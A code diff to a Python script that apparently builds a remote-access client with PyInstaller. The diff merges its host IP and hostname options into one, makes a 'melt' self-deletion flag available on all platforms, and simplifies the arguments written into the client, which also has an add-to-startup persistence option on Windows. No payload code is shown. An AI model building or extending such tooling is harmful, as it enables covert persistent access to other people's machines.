@@ -66,16 +66,15 @@ def get_pyinstaller():
 
 def parse_args():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-hI", "--host-ip", help="Host IP", type=str, default="127.0.0.1", dest="host_ip")
-    parser.add_argument("-hH", "--host-hostname", help="Host Hostname (overrides host IP)", dest="host_hostname")
+    parser.add_argument("-o", "--host", help="Host IP/hostname", type=str, default="127.0.0.1", dest="host")
     parser.add_argument("-p", "--port", help="Port", type=int, default="3003", dest="port")
     parser.add_argument("-i", "--icon", help="Path to icon file", type=str, dest="icon")
     parser.add_argument("-c", "--console", help="Console app", action="store_true", dest="console")
     parser.add_argument("-d", "--debug", help="PyInstaller debug", action="store_true", dest="debug")
+    parser.add_argument("-m", "--melt", help="Melt file on startup", action="store_true", dest="melt")
 
     if platforms.OS == platforms.WINDOWS:
         parser.add_argument("-s", "--startup", help="Add to startup on launch", action="store_true", dest="startup")
-        parser.add_argument("-m", "--melt", help="Melt file on startup", action="store_true", dest="melt")
 
     return parser.parse_args()
 
@@ -93,10 +92,10 @@ class Main:
 
     def update_client(self):
         client_args = \
-            [f"'{self.host.lstrip().rstrip()}'",
-             str(self.args.port), str(self.args.host_hostname is not None),
+            [f"'{self.args.host.lstrip().rstrip()}'",
+             str(self.args.port),
              str(hasattr(self.args, "startup") and self.args.startup),
-             str(hasattr(self.args, "melt") and str(self.args.melt))]
+             str(self.args.melt)]
 
         main_match = "if __name__ == \"__main__\":"
         client_new_line = f"{main_match}\n{4 * ' '}MainClient({', '.join(client_args)}).start()\n"
@@ -119,11 +118,6 @@ class Main:
 
     def parse_args(self):
         self.args = parse_args()
-
-        if self.args.host_hostname:
-            self.host = self.args.host_hostname
-        else:
-            self.host = self.args.host_ip
 
         if self.args.port:
             if self.args.port > 65535 or self.args.port < 1024:
